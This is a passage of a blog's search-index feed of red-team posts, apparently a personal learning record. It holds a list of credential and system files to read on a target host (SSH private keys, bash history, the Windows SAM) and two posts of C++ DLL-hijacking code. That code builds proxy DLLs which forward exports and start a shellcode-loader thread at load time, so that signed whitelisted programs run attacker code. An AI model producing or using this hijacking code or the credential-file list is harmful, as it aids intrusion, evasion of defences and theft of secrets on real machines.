src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145658925.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145709773.png" alt="image"></p><pre class="line-numbers language-none"><code class="language-none">Must conform to the relevant grammatical structure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145815560.png" alt="image"></p><pre class="line-numbers language-none"><code class="language-none">Note that you need to distinguish between 64 and 32 bits!!In the same way, you can run the program here and you can go online，The basic operations are omitted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sensitive path information concerns</title>
      <link href="2021/07/21/sensitive-path-information-concerns/"/>
      <url>2021/07/21/sensitive-path-information-concerns/</url>
      
        <content type="html"><![CDATA[<h6 id="If-there-is-insufficient-the-follow-up-to-continue"><a href="#If-there-is-insufficient-the-follow-up-to-continue" class="headerlink" title="If there is insufficient, the follow-up to continue"></a>If there is insufficient, the follow-up to continue</h6><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="apache-amp-apache2"><a href="#apache-amp-apache2" class="headerlink" title="apache&amp;apache2"></a>apache&amp;apache2</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;apache&#x2F;httpd.conf&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;etc&#x2F;httpd&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf&#x2F;home&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;etc&#x2F;rc.local &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf  web file&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F; config file&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F; all config file&#x2F;etc&#x2F;apache2&#x2F;apache2.conf Apache config file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;mounts File system list&#x2F;proc&#x2F;cpuinfo CPU&#x2F;proc&#x2F;meminfo memory&#x2F;proc&#x2F;self -&gt; pid information&#x2F;proc&#x2F;self&#x2F;environ environment variable&#x2F;proc&#x2F;[pid]&#x2F;cmdline Process start parameter  such as &#x2F;proc&#x2F;1&#x2F;cmdline&#x2F;proc&#x2F;[pid]&#x2F;mountinfo Information about the file system mount&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;[fd] The file that the process opened&#x2F;proc&#x2F;[pid]&#x2F;exe An exe file that points to the process&#x2F;proc&#x2F;config.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;hosts.deny &#x2F;etc&#x2F;bashrc &#x2F;etc&#x2F;issue &#x2F;etc&#x2F;issue&#x2F;net &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;termcap &#x2F;etc&#x2F;xinetd.d&#x2F;etc&#x2F;mtab &#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf&#x2F;etc&#x2F;xinetd.conf &#x2F;etc&#x2F;protocols &#x2F;etc&#x2F;logrotate.conf &#x2F;etc&#x2F;ld.so.conf &#x2F;etc&#x2F;resolv.conf &#x2F;etc&#x2F;sysconfig&#x2F;network&#x2F;etc&#x2F;sendmail.cf&#x2F;etc&#x2F;sendmail.cw <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Root-permission-required"><a href="#Root-permission-required" class="headerlink" title="Root permission required"></a>Root permission required</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys&#x2F;root&#x2F;.ssh&#x2F;id_rsa&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub&#x2F;root&#x2F;.ssh&#x2F;known_hosts&#x2F;root&#x2F;.bash_history&#x2F;root&#x2F;.mysql_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><pre class="line-numbers language-none"><code class="language-none">c:\boot.inic:\windows\systems32\inetsrv\MetaBase.xmlc:\windows\repair\samC:\windows\system32\config\sam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Essays record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Information collection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL hijacking the whitelist application online</title>
      <link href="2021/07/20/dll-hijacking-the-whitelist-application-online/"/>
      <url>2021/07/20/dll-hijacking-the-whitelist-application-online/</url>
      
        <content type="html"><![CDATA[<h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><p>Application EXE unsigned white program, call their own compiled black DLL, here to QQ housekeeper function as a case, the implementation of the source code is as follows</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">extern &quot;C&quot; __declspec(dllexport) void test();DWORD WINAPI DDOS(LPVOID lpParameter)&#123;your shellcode loader&#125;staticHMODULE g_OldModule &#x3D; NULL;VOID WINAPI Free()&#123;if (g_OldModule)&#123;FreeLibrary(g_OldModule);&#125;&#125;BOOL WINAPI Load()&#123;TCHAR tzPath[MAX_PATH];TCHAR tzTemp[MAX_PATH * 2];&#x2F;&#x2F;GetModuleFileName(NULL,tzPath,MAX_PATH); &#x2F;&#x2F;PathRemoveFileSpec(tzPath);GetSystemDirectory(tzPath, MAX_PATH); lstrcat(tzPath, TEXT(&quot;\\dllname.dll&quot;));g_OldModule &#x3D; LoadLibrary(tzPath);if (g_OldModule &#x3D;&#x3D; NULL)&#123;wsprintf(tzTemp, TEXT(&quot;无法找到模块 %s,程序无法正常运行&quot;), tzPath);MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);&#125;return (g_OldModule !&#x3D; NULL);&#125;FARPROC WINAPI GetAddress(PCSTR pszProcName)&#123;FARPROC fpAddress;CHAR szProcName[64];TCHAR tzTemp[MAX_PATH];fpAddress &#x3D; GetProcAddress(g_OldModule, pszProcName);if (fpAddress &#x3D;&#x3D; NULL)&#123;if (HIWORD(pszProcName) &#x3D;&#x3D; 0)&#123;wsprintfA(szProcName, &quot;#%d&quot;, pszProcName);pszProcName &#x3D; szProcName;&#125;wsprintf(tzTemp, TEXT(&quot;无法找到函数 %hs,程序无法正常运行&quot;), pszProcName);MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);ExitProcess(-2);&#125;return fpAddress;&#125;BOOL WINAPI Init()&#123;pfnAheadLib_GetVgaAllInfo &#x3D; GetAddress(&quot;GetVgaAllInfo&quot;);pfnAheadLib_GetVgaTemp &#x3D; GetAddress(&quot;GetVgaTemp&quot;);return TRUE;&#125;DWORD WINAPI ThreadProc(LPVOID lpThreadParameter)&#123;HANDLE hProcess;PVOID addr1 &#x3D; reinterpret_cast&lt;PVOID&gt;(0x00401000);BYTE data1[] &#x3D; &#123; 0x90, 0x90, 0x90, 0x90 &#125;;hProcess &#x3D; OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());if (hProcess)&#123;WriteProcessMemory(hProcess, addr1, data1, sizeof(data1), NULL);CloseHandle(hProcess);&#125;return 0;&#125;BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)&#123;HANDLE threadHandle;threadHandle &#x3D; CreateThread(NULL, 0, DDOS, NULL, 0, NULL);if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)&#123;DisableThreadLibraryCalls(hModule);if (Load() &amp;&amp; Init())&#123;TCHAR szAppName[MAX_PATH] &#x3D; TEXT(&quot;MyApp.exe&quot;);TCHAR szCurName[MAX_PATH];GetModuleFileName(NULL, szCurName, MAX_PATH);PathStripPath(szCurName);if (StrCmpI(szCurName, szAppName) &#x3D;&#x3D; 0)&#123;HANDLE hThread &#x3D; CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);if (hThread)&#123;CloseHandle(hThread);&#125;&#125;&#125;&#125;else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)&#123;Free();&#125;return TRUE;&#125;EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaAllInfo(void)&#123;__asm jmp pfnAheadLib_GetVgaAllInfo;&#125;EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaTemp(void)&#123;__asm jmp pfnAheadLib_GetVgaTemp;&#125;void test()&#123;MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, MB_OK);HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;dllname.dll&quot;);if (hDllInst)&#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc)&#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Final-result"><a href="#Final-result" class="headerlink" title="Final result"></a>Final result</h2><p>Use the signed white program to call the black DLL successfully online the target machine</p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL hijacking from hijacking to on-line</title>
      <link href="2021/07/19/dll-hijacking-from-hijacking-to-on-line/"/>
      <url>2021/07/19/dll-hijacking-from-hijacking-to-on-line/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">用中文写下理论知识，避免翻译的会看不懂了DLL（Dynamic Link Library），全称动态链接库，是Windows系统上程序正常运行必不可少的功能模块，是实现代码重用的具体形式。简单的说，可以把DLL理解成帮助程序完成各种功能的组件。DLL劫持，通过一些手段来劫持或者替换正常的DLL，从而加载编译好的恶意DLL漏洞成因，调用loadlibrary可使用DLL的相对路径，这是系统会按照特定的顺序搜索一些目录，便于确认DLL的路径，根据官方文档的定义，在使用相对路径调用loadlibrary时，系统会依次从下方6个路径去寻找所需要的DLL程序所在目录加载 DLL 时所在的当前目录系统目录即SYSTEM32目录16位系统目录即SYSTEM目录Windows目录PATH环境变量中列出的目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Easy-Study"><a href="#Easy-Study" class="headerlink" title="Easy Study"></a>Easy Study</h2><pre class="line-numbers language-none"><code class="language-none">A lot of basic grammar is required here, so I won&#39;t go into detail hereHere use forward to implementationProgram A calls the function in AAA.dll, now change the AAA.dll to AAA_o.dll, then write A new AAA.dll and forward the original function to AAA_o.dllThe DLL is as follows. You need to write an EXE to call the DLL and its functionsaaa.dllextern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test() &#123;MessageBox(NULL, L&quot;aaa.dll success&quot;, L&quot;s&quot;, 0); &#125;the successful call has the following effect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/1.png" alt="1"></p><pre class="line-numbers language-none"><code class="language-none">Take a look at the export function and confirm the test export function<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/2.png" alt="2"></p><pre class="line-numbers language-none"><code class="language-none">new dllextern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:WinExec(&quot;calc.exe&quot;, SW_HIDE); case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test() &#123;MessageBox(NULL, L&quot;SUCCESS&quot;, L&quot;SSSSS&quot;, 0); HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa_o.dll&quot;);if (hDllInst) &#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc) &#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;The effect after hijacking is as followsA different way to use precompilation is much faster#pragma comment(linker, &quot;&#x2F;EXPORT:&lt;Function name&gt;&#x3D;&lt;Dll name&gt;.&lt;Function name&gt;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/3.png" alt="3"></p><h2 id="How-to-Online"><a href="#How-to-Online" class="headerlink" title="How to Online"></a>How to Online</h2><pre class="line-numbers language-none"><code class="language-none">extern &quot;C&quot; __declspec(dllexport) void test();DWORD WINAPI DoSC(LPVOID lpParameter)&#123;Like you SC loader&#125;BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:HANDLE threadHandle;threadHandle &#x3D; CreateThread(NULL, 0, DoSC, NULL, 0, NULL);break;case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test()&#123;MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, 0);HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa.dll&quot;);if (hDllInst)&#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc)&#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;You can do this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/4.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最近太忙了，等过两天有空了开始更新！</title>
      <link href="2021/03/23/zui-jin-tai-mang-liao-deng-guo-liang-tian-you-kong-liao-kai-shi-geng-xin/"/>
      <url>2021/03/23/zui-jin-tai-mang-liao-deng-guo-liang-tian-you-kong-liao-kai-shi-geng-xin/</url>
      
        <content type="html"><![CDATA[<h2 id="博客暂未完全调试好，敬请期待"><a href="#博客暂未完全调试好，敬请期待" class="headerlink" title="博客暂未完全调试好，敬请期待"></a>博客暂未完全调试好，敬请期待</h2>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
